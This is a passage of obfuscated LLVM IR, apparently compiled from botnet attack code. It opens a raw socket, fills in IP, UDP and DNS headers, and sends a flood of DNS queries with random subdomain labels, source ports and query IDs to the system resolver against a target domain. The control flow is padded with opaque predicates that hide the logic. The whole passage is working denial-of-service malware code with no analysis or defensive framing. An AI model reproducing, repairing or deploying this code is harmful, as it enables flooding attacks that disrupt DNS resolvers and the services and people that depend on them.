  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 2, i32 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 3, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 4, i32 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 5, i32 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 6, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 7, i32 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 9, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 0, i32 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 8, i8* null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  %79 = icmp eq i8* %78, null
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %4
  br label %588

; <label>:81:                                     ; preds = %4
  %82 = load i8*, i8** %20, align 8
  %83 = call i32 @util_strlen(i8* %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %81
  br label %588

; <label>:87:                                     ; preds = %81
  %88 = load i32, i32* @x.37
  %89 = load i32, i32* @y.38
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %87
  store i32 1, i32* %9, align 4
  %96 = load i32, i32* %10, align 4
  %97 = bitcast i32* %9 to i8*
  %98 = call i32 @setsockopt(i32 %96, i32 0, i32 3, i8* %97, i32 4) #6
  %99 = icmp eq i32 %98, -1
  %100 = load i32, i32* @x.37
  %101 = load i32, i32* @y.38
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %99, label %108, label %111

; <label>:108:                                    ; preds = %originalBBpart2
  %109 = load i32, i32* %10, align 4
  %110 = call i32 @close(i32 %109)
  br label %588

; <label>:111:                                    ; preds = %originalBBpart2
  store i32 0, i32* %9, align 4
  br label %112

; <label>:112:                                    ; preds = %337, %111
  %113 = load i32, i32* %9, align 4
  %114 = load i8, i8* %5, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp slt i32 %113, %115
  br i1 %116, label %117, label %340

; <label>:117:                                    ; preds = %112
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %118 = call noalias i8* @calloc(i64 600, i64 1) #6
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  store i8* %118, i8** %122, align 8
  %123 = load i8**, i8*** %11, align 8
  %124 = load i32, i32* %9, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8*, i8** %123, i64 %125
  %127 = load i8*, i8** %126, align 8
  %128 = bitcast i8* %127 to %struct.iphdr*
  store %struct.iphdr* %128, %struct.iphdr** %26, align 8
  %129 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i64 1
  %131 = bitcast %struct.iphdr* %130 to %struct.udphdr*
  store %struct.udphdr* %131, %struct.udphdr** %27, align 8
  %132 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %133 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %132, i64 1
  %134 = bitcast %struct.udphdr* %133 to %struct.dnshdr*
  store %struct.dnshdr* %134, %struct.dnshdr** %28, align 8
  %135 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %136 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %135, i64 1
  %137 = bitcast %struct.dnshdr* %136 to i8*
  store i8* %137, i8** %29, align 8
  %138 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %139 = bitcast %struct.iphdr* %138 to i8*
  %140 = load i8, i8* %139, align 4
  %141 = and i8 %140, 15
  %142 = or i8 %141, 64
  store i8 %142, i8* %139, align 4
  %143 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %144 = bitcast %struct.iphdr* %143 to i8*
  %145 = load i8, i8* %144, align 4
  %146 = and i8 %145, -16
  %147 = or i8 %146, 5
  store i8 %147, i8* %144, align 4
  %148 = load i8, i8* %12, align 1
  %149 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 1
  store i8 %148, i8* %150, align 1
  %151 = load i8, i8* %19, align 1
  %152 = zext i8 %151 to i64
  %153 = add i64 41, %152
  %154 = add i64 %153, 2
  %155 = load i32, i32* %21, align 4
  %156 = sext i32 %155 to i64
  %157 = add i64 %154, %156
  %158 = add i64 %157, 4
  %159 = trunc i64 %158 to i16
  %160 = call zeroext i16 @htons(i16 zeroext %159) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 2
  store i16 %160, i16* %162, align 2
  %163 = load i16, i16* %13, align 2
  %164 = call zeroext i16 @htons(i16 zeroext %163) #7
  %165 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 3
  store i16 %164, i16* %166, align 4
  %167 = load i8, i8* %14, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 5
  store i8 %167, i8* %169, align 4
  %170 = load i8, i8* %15, align 1
  %171 = icmp ne i8 %170, 0
  br i1 %171, label %172, label %176

; <label>:172:                                    ; preds = %117
  %173 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %174 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 4
  store i16 %173, i16* %175, align 2
  br label %176

; <label>:176:                                    ; preds = %172, %117
  %177 = load i32, i32* @x.37
  %178 = load i32, i32* @y.38
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %176
  %185 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 6
  store i8 17, i8* %186, align 1
  %187 = load i32, i32* @LOCAL_ADDR, align 4
  %188 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 8
  store i32 %187, i32* %189, align 4
  %190 = load i32, i32* %22, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 9
  store i32 %190, i32* %192, align 4
  %193 = load i16, i16* %16, align 2
  %194 = call zeroext i16 @htons(i16 zeroext %193) #7
  %195 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %196 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %195, i32 0, i32 0
  store i16 %194, i16* %196, align 2
  %197 = load i16, i16* %17, align 2
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %200 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %199, i32 0, i32 1
  store i16 %198, i16* %200, align 2
  %201 = load i8, i8* %19, align 1
  %202 = zext i8 %201 to i64
  %203 = add i64 21, %202
  %204 = add i64 %203, 2
  %205 = load i32, i32* %21, align 4
  %206 = sext i32 %205 to i64
  %207 = add i64 %204, %206
  %208 = add i64 %207, 4
  %209 = trunc i64 %208 to i16
  %210 = call zeroext i16 @htons(i16 zeroext %209) #7
  %211 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %212 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %211, i32 0, i32 2
  store i16 %210, i16* %212, align 2
  %213 = load i16, i16* %18, align 2
  %214 = call zeroext i16 @htons(i16 zeroext %213) #7
  %215 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %216 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %215, i32 0, i32 0
  store i16 %214, i16* %216, align 2
  %217 = call zeroext i16 @htons(i16 zeroext 256) #7
  %218 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %219 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %218, i32 0, i32 1
  store i16 %217, i16* %219, align 2
  %220 = call zeroext i16 @htons(i16 zeroext 1) #7
  %221 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %222 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %221, i32 0, i32 2
  store i16 %220, i16* %222, align 2
  %223 = load i8, i8* %19, align 1
  %224 = load i8*, i8** %29, align 8
  %225 = getelementptr inbounds i8, i8* %224, i32 1
  store i8* %225, i8** %29, align 8
  store i8 %223, i8* %224, align 1
  %226 = load i8, i8* %19, align 1
  %227 = zext i8 %226 to i32
  %228 = load i8*, i8** %29, align 8
  %229 = sext i32 %227 to i64
  %230 = getelementptr inbounds i8, i8* %228, i64 %229
  store i8* %230, i8** %29, align 8
  %231 = load i8*, i8** %29, align 8
  store i8* %231, i8** %30, align 8
  %232 = load i8*, i8** %29, align 8
  %233 = getelementptr inbounds i8, i8* %232, i64 1
  %234 = load i8*, i8** %20, align 8
  %235 = load i32, i32* %21, align 4
  %236 = add nsw i32 %235, 1
  call void @util_memcpy(i8* %233, i8* %234, i32 %236)
  store i32 0, i32* %23, align 4
  %237 = load i32, i32* @x.37
  %238 = load i32, i32* @y.38
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBBpart236, label %originalBB1alteredBB

originalBBpart236:                                ; preds = %originalBB1
  br label %245

; <label>:245:                                    ; preds = %303, %originalBBpart236
  %246 = load i32, i32* %23, align 4
  %247 = load i32, i32* %21, align 4
  %248 = icmp slt i32 %246, %247
  br i1 %248, label %249, label %306

; <label>:249:                                    ; preds = %245
  %250 = load i32, i32* @x.37
  %251 = load i32, i32* @y.38
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %249
  %258 = load i8*, i8** %20, align 8
  %259 = load i32, i32* %23, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds i8, i8* %258, i64 %260
  %262 = load i8, i8* %261, align 1
  %263 = sext i8 %262 to i32
  %264 = icmp eq i32 %263, 46
  %265 = load i32, i32* @x.37
  %266 = load i32, i32* @y.38
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %264, label %273, label %283

; <label>:273:                                    ; preds = %originalBBpart240
  %274 = load i8, i8* %24, align 1
  %275 = load i8*, i8** %30, align 8
  store i8 %274, i8* %275, align 1
  store i8 0, i8* %24, align 1
  %276 = load i8, i8* %25, align 1
  %277 = add i8 %276, 1
  store i8 %277, i8* %25, align 1
  %278 = load i8*, i8** %29, align 8
  %279 = load i32, i32* %23, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds i8, i8* %278, i64 %280
  %282 = getelementptr inbounds i8, i8* %281, i64 1
  store i8* %282, i8** %30, align 8
  br label %286

; <label>:283:                                    ; preds = %originalBBpart240
  %284 = load i8, i8* %24, align 1
  %285 = add i8 %284, 1
  store i8 %285, i8* %24, align 1
  br label %286

; <label>:286:                                    ; preds = %283, %273
  %287 = load i32, i32* @x.37
  %288 = load i32, i32* @y.38
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %286
  %295 = load i32, i32* @x.37
  %296 = load i32, i32* @y.38
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %303

; <label>:303:                                    ; preds = %originalBBpart244
  %304 = load i32, i32* %23, align 4
  %305 = add nsw i32 %304, 1
  store i32 %305, i32* %23, align 4
  br label %245

; <label>:306:                                    ; preds = %245
  %307 = load i32, i32* @x.37
  %308 = load i32, i32* @y.38
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %306
  %315 = load i8, i8* %24, align 1
  %316 = load i8*, i8** %30, align 8
  store i8 %315, i8* %316, align 1
  %317 = load i8*, i8** %29, align 8
  %318 = load i32, i32* %21, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds i8, i8* %317, i64 %319
  %321 = getelementptr inbounds i8, i8* %320, i64 2
  %322 = bitcast i8* %321 to %struct.grehdr*
  store %struct.grehdr* %322, %struct.grehdr** %31, align 8
  %323 = call zeroext i16 @htons(i16 zeroext 1) #7
  %324 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %325 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %324, i32 0, i32 0
  store i16 %323, i16* %325, align 2
  %326 = call zeroext i16 @htons(i16 zeroext 1) #7
  %327 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %328 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %327, i32 0, i32 1
  store i16 %326, i16* %328, align 2
  %329 = load i32, i32* @x.37
  %330 = load i32, i32* @y.38
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %337

; <label>:337:                                    ; preds = %originalBBpart248
  %338 = load i32, i32* %9, align 4
  %339 = add nsw i32 %338, 1
  store i32 %339, i32* %9, align 4
  br label %112

; <label>:340:                                    ; preds = %112
  %341 = load i32, i32* @x.37
  %342 = load i32, i32* @y.38
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %340
  %349 = load i32, i32* @x.37
  %350 = load i32, i32* @y.38
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %357

; <label>:357:                                    ; preds = %originalBBpart277, %originalBBpart252
  %358 = load i32, i32* @x.37
  %359 = load i32, i32* @y.38
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %357
  store i32 0, i32* %9, align 4
  %366 = load i32, i32* @x.37
  %367 = load i32, i32* @y.38
  %368 = sub i32 %366, 1
  %369 = mul i32 %366, %368
  %370 = urem i32 %369, 2
  %371 = icmp eq i32 %370, 0
  %372 = icmp slt i32 %367, 10
  %373 = or i1 %371, %372
  br i1 %373, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %374

; <label>:374:                                    ; preds = %568, %originalBBpart256
  %375 = load i32, i32* @x.37
  %376 = load i32, i32* @y.38
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %374
  %383 = load i32, i32* %9, align 4
  %384 = load i8, i8* %5, align 1
  %385 = zext i8 %384 to i32
  %386 = icmp slt i32 %383, %385
  %387 = load i32, i32* @x.37
  %388 = load i32, i32* @y.38
  %389 = sub i32 %387, 1
  %390 = mul i32 %387, %389
  %391 = urem i32 %390, 2
  %392 = icmp eq i32 %391, 0
  %393 = icmp slt i32 %388, 10
  %394 = or i1 %392, %393
  br i1 %394, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %386, label %395, label %571

; <label>:395:                                    ; preds = %originalBBpart260
  %396 = load i32, i32* @x.37
  %397 = load i32, i32* @y.38
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %395
  %404 = load i8**, i8*** %11, align 8
  %405 = load i32, i32* %9, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds i8*, i8** %404, i64 %406
  %408 = load i8*, i8** %407, align 8
  store i8* %408, i8** %32, align 8
  %409 = load i8*, i8** %32, align 8
  %410 = bitcast i8* %409 to %struct.iphdr*
  store %struct.iphdr* %410, %struct.iphdr** %33, align 8
  %411 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %412 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %411, i64 1
  %413 = bitcast %struct.iphdr* %412 to %struct.udphdr*
  store %struct.udphdr* %413, %struct.udphdr** %34, align 8
  %414 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %415 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %414, i64 1
  %416 = bitcast %struct.udphdr* %415 to %struct.dnshdr*
  store %struct.dnshdr* %416, %struct.dnshdr** %35, align 8
  %417 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %418 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %417, i64 1
  %419 = bitcast %struct.dnshdr* %418 to i8*
  %420 = getelementptr inbounds i8, i8* %419, i64 1
  store i8* %420, i8** %36, align 8
  %421 = load i16, i16* %13, align 2
  %422 = zext i16 %421 to i32
  %423 = icmp eq i32 %422, 65535
  %424 = load i32, i32* @x.37
  %425 = load i32, i32* @y.38
  %426 = sub i32 %424, 1
  %427 = mul i32 %424, %426
  %428 = urem i32 %427, 2
  %429 = icmp eq i32 %428, 0
  %430 = icmp slt i32 %425, 10
  %431 = or i1 %429, %430
  br i1 %431, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %423, label %432, label %438

; <label>:432:                                    ; preds = %originalBBpart264
  %433 = call i32 @rand_next()
  %434 = and i32 %433, 65535
  %435 = trunc i32 %434 to i16
  %436 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %437 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %436, i32 0, i32 3
  store i16 %435, i16* %437, align 4
  br label %438

; <label>:438:                                    ; preds = %432, %originalBBpart264
  %439 = load i16, i16* %16, align 2
  %440 = zext i16 %439 to i32
  %441 = icmp eq i32 %440, 65535
  br i1 %441, label %442, label %448

; <label>:442:                                    ; preds = %438
  %443 = call i32 @rand_next()
  %444 = and i32 %443, 65535
  %445 = trunc i32 %444 to i16
  %446 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %447 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %446, i32 0, i32 0
  store i16 %445, i16* %447, align 2
  br label %448

; <label>:448:                                    ; preds = %442, %438
  %449 = load i16, i16* %17, align 2
  %450 = zext i16 %449 to i32
  %451 = icmp eq i32 %450, 65535
  br i1 %451, label %452, label %458

; <label>:452:                                    ; preds = %448
  %453 = call i32 @rand_next()
  %454 = and i32 %453, 65535
  %455 = trunc i32 %454 to i16
  %456 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %457 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %456, i32 0, i32 1
  store i16 %455, i16* %457, align 2
  br label %458

; <label>:458:                                    ; preds = %452, %448
  %459 = load i32, i32* @x.37
  %460 = load i32, i32* @y.38
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %458
  %467 = load i16, i16* %18, align 2
  %468 = zext i16 %467 to i32
  %469 = icmp eq i32 %468, 65535
  %470 = load i32, i32* @x.37
  %471 = load i32, i32* @y.38
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %469, label %478, label %500

; <label>:478:                                    ; preds = %originalBBpart268
  %479 = load i32, i32* @x.37
  %480 = load i32, i32* @y.38
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %478
  %487 = call i32 @rand_next()
  %488 = and i32 %487, 65535
  %489 = trunc i32 %488 to i16
  %490 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %491 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %490, i32 0, i32 0
  store i16 %489, i16* %491, align 2
  %492 = load i32, i32* @x.37
  %493 = load i32, i32* @y.38
  %494 = sub i32 %492, 1
  %495 = mul i32 %492, %494
  %496 = urem i32 %495, 2
  %497 = icmp eq i32 %496, 0
  %498 = icmp slt i32 %493, 10
  %499 = or i1 %497, %498
  br i1 %499, label %originalBBpart273, label %originalBB70alteredBB

originalBBpart273:                                ; preds = %originalBB70
  br label %500

; <label>:500:                                    ; preds = %originalBBpart273, %originalBBpart268
  %501 = load i8*, i8** %36, align 8
  %502 = load i8, i8* %19, align 1
  %503 = zext i8 %502 to i32
  call void @rand_alpha_str(i8* %501, i32 %503)
  %504 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %505 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %504, i32 0, i32 7
  store i16 0, i16* %505, align 2
  %506 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %507 = bitcast %struct.iphdr* %506 to i16*
  %508 = call zeroext i16 @checksum_generic(i16* %507, i32 20)
  %509 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %510 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %509, i32 0, i32 7
  store i16 %508, i16* %510, align 2
  %511 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %512 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %511, i32 0, i32 3
  store i16 0, i16* %512, align 2
  %513 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %514 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %515 = bitcast %struct.udphdr* %514 to i8*
  %516 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %517 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %516, i32 0, i32 2
  %518 = load i16, i16* %517, align 2
  %519 = load i8, i8* %19, align 1
  %520 = zext i8 %519 to i64
  %521 = add i64 21, %520
  %522 = add i64 %521, 2
  %523 = load i32, i32* %21, align 4
  %524 = sext i32 %523 to i64
  %525 = add i64 %522, %524
  %526 = add i64 %525, 4
  %527 = trunc i64 %526 to i32
  %528 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %513, i8* %515, i16 zeroext %518, i32 %527)
  %529 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %530 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %529, i32 0, i32 3
  store i16 %528, i16* %530, align 2
  %531 = load i32, i32* %22, align 4
  %532 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %533 = load i32, i32* %9, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %532, i64 %534
  %536 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %535, i32 0, i32 0
  %537 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %536, i32 0, i32 2
  %538 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %537, i32 0, i32 0
  store i32 %531, i32* %538, align 4
  %539 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %540 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %539, i32 0, i32 1
  %541 = load i16, i16* %540, align 2
  %542 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %543 = load i32, i32* %9, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %542, i64 %544
  %546 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %545, i32 0, i32 0
  %547 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %546, i32 0, i32 1
  store i16 %541, i16* %547, align 2
  %548 = load i32, i32* %10, align 4
  %549 = load i8*, i8** %32, align 8
  %550 = load i8, i8* %19, align 1
  %551 = zext i8 %550 to i64
  %552 = add i64 41, %551
  %553 = add i64 %552, 2
  %554 = load i32, i32* %21, align 4
  %555 = sext i32 %554 to i64
  %556 = add i64 %553, %555
  %557 = add i64 %556, 4
  %558 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %559 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %560 = load i32, i32* %9, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %559, i64 %561
  %563 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %562, i32 0, i32 0
  %564 = bitcast %struct.sockaddr_in* %563 to %struct.sockaddr*
  store %struct.sockaddr* %564, %struct.sockaddr** %558, align 8
